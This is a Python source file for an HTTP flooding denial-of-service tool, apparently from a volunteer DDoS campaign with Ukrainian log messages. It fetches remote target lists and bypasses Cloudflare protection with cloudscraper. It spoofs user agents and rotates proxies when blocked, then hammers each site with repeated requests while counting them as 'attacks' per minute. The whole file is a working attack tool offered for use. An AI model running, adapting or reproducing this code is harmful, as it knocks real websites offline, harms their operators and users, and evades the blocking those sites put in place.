import logging
import os
import random

from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor
from sys import stderr
from threading import Thread
from time import sleep
from random import choice

import cloudscraper
from loguru import logger
from pyuseragents import random as random_useragent
from urllib3 import disable_warnings

from atomic_counter import AtomicCounter
last_count = 0
last_proxied_count = 0

from threading import RLock
lock = RLock()
targets_per_min = {}

from settings import get_settings
settings = get_settings()

from RemoteProvider import RemoteProvider

disable_warnings()

parser = ArgumentParser()
parser.add_argument('threads', nargs='?', default=settings.MAX_THREADS)
parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
parser.set_defaults(verbose=False)
parser.add_argument("-lo", "--logger-output", dest="logger_output")
parser.add_argument("-lr", "--logger-results", dest="logger_results")
parser.set_defaults(no_clear=False)
parser.set_defaults(proxy_view=False)
parser.set_defaults(logger_output=stderr)
parser.set_defaults(logger_results=stderr)
args, unknown = parser.parse_known_args()
no_clear = args.no_clear
proxy_view = args.proxy_view

remoteProvider = RemoteProvider(args.targets)
threads = int(args.threads)

submitted_tasks = []
executor = ThreadPoolExecutor(max_workers=threads * 2)
counter = AtomicCounter()
proxied_counter = AtomicCounter()

logger.remove()
logger.add(
    args.logger_output,
    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
        <cyan>{line}</cyan> - <white>{message}</white>")
logger.add(
    args.logger_results,
    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
        <cyan>{line}</cyan> - <white>{message}</white>",
    level="SUCCESS")


def check_req():
    os.system("python3 -m pip install -r requirements.txt")
    os.system("python -m pip install -r requirements.txt")
    os.system("pip install -r requirements.txt")
    os.system("pip3 install -r requirements.txt")


def mainth(site: str):
    scraper = cloudscraper.create_scraper(browser=settings.BROWSER, )
    count_attacks_for_current_site = 0

    headers_http = {
        'Content-Type': 'text/html;',
        'Connection': 'keep-alive',
        'Accept': 'text/*, text/html, text/html;level=1, */*',
        'Accept-Language': 'ru',
        'Accept-Encoding': 'gzip, deflate, br',
        'User-Agent': random_useragent()
    }

    try:
        probe = scraper.get(site, headers=headers_http, timeout=settings.READ_TIMEOUT)
        if probe.status_code >= 302:
            # use 10 random proxies from a list
            sampled_proxies = random.sample(remoteProvider.get_proxies(), 50)
            for proxy in sampled_proxies:
                if count_attacks_for_current_site >= settings.MAX_REQUESTS_TO_SITE:
                    return

                proxy_ip = proxy.get("ip")
                proxy_scheme = proxy.get("scheme")
                selected_proxies = {
                    'http': f'{proxy_scheme}://{proxy_ip}',
                    'https': f'{proxy_scheme}://{proxy_ip}'
                }
                response = scraper.get(site, headers=headers_http, proxies=selected_proxies, timeout=settings.READ_TIMEOUT)

                proxied_status_code = response.status_code
                # logger.info(f"{site} -> {proxied_status_code}")
                if 200 <= proxied_status_code <= 302:
                    while count_attacks_for_current_site < settings.MAX_REQUESTS_TO_SITE:
                        response = scraper.get(site, headers=headers_http, timeout=settings.READ_TIMEOUT)
                        if response.status_code >= 400:
                            break
                        proxied_counter.increment()
                        count_attacks_for_current_site += 1
                        increment_global_counters(site)

        else:
            while count_attacks_for_current_site < settings.MAX_REQUESTS_TO_SITE:
                response = scraper.get(site, headers=headers_http, timeout=settings.READ_TIMEOUT)
                non_proxied_status_code = response.status_code
                # logger.info(f"{site} -> {non_proxied_status_code}")
                if non_proxied_status_code >= 400:
                    break
                count_attacks_for_current_site += 1
                increment_global_counters(site)
    except Exception as ex:
        pass
        # logger.error(ex)


def increment_global_counters(site):
    counter.increment()
    with lock:
        if site not in targets_per_min:
            targets_per_min[site] = 1
        else:
            targets_per_min[site] += 1

def monitor_thread():
    while True:
        sleep(60)
        current_count = counter.value()
        global last_count
        delta = current_count - last_count
        logger.info(f"Швидкість: <<< {str(delta)} >>> вдалих запитів за хвилину. Детально ('сайт': запити) -> {str(targets_per_min)}")
        last_count = current_count
        with lock:
            targets_per_min.clear()

def proxied_monitor():
    while True:
        sleep(300)
        current_proxied_count = proxied_counter.value()
        global last_proxied_count
        proxied_delta = current_proxied_count - last_proxied_count
        last_proxied_count = current_proxied_count
        logger.info(f"Зроблено {str(proxied_delta)} запитів через проксі за 5 хвилин")
        logger.info("Нагадування: подивитись статус цілей можно за посиланням: https://ignitedevua.github.io/a/")

def runningTasksCount():
    r = 0
    for task in submitted_tasks:
        if task.running():
            r += 1
        if task.done():
            submitted_tasks.remove(task)
        if task.cancelled():
            submitted_tasks.remove(task)
    return r

def get_target_sites_with_fallback():
    sites = remoteProvider.get_target_sites()
    if not sites:
        logging.warning("Target sites cannot be loaded, using default targets for now")
        return settings.DEFAULT_TARGETS
    return sites

if __name__ == '__main__':
    check_req()
    Thread(target=monitor_thread, daemon=True).start()
    Thread(target=proxied_monitor, daemon=True).start()
    sites = get_target_sites_with_fallback()
    # initially start as many tasks as configured threads
    logger.info(f"Перша статистика з'явиться тут за хвилину. Подивитись статус цілей можно за посиланням: https://ignitedevua.github.io/a/")
    logger.info(f"Пам'ятка: при запуску через ./flood.sh run програма буде автоматично перезавантажуватися кожні 15 хвилин; при перезавантаженні попередні логи стираються -> треба буде знову запускати ./flood.sh log")
    for _ in range(threads):
        submitted_tasks.append(executor.submit(mainth, choice(get_target_sites_with_fallback())))

    while True:
        currentRunningCount = runningTasksCount()
        while currentRunningCount < threads:
            submitted_tasks.append(executor.submit(mainth, choice(get_target_sites_with_fallback())))
            currentRunningCount += 1
        sleep(1)

